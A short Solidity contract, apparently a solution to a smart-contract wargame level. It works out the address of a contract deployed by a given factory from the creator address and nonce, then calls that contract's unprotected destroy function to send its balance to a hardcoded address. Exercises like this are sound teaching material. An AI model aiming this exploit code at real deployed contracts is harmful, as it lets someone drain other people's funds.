pragma solidity ^0.8;

interface SimpleToken {
	function destroy(address) external;
}

contract expl {
        // We can simply recover the address through the formula 
        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
	function pwn(address s) public {
		address addr = address(uint160(uint256(
					keccak256(abi.encodePacked(
						bytes1(0xd6), bytes1(0x94), s, bytes1(0x01)
					))
				)));

		SimpleToken(addr).destroy(0x6256E0e4b47f07d277D4e5dEDc394736252831DE);
	}
}
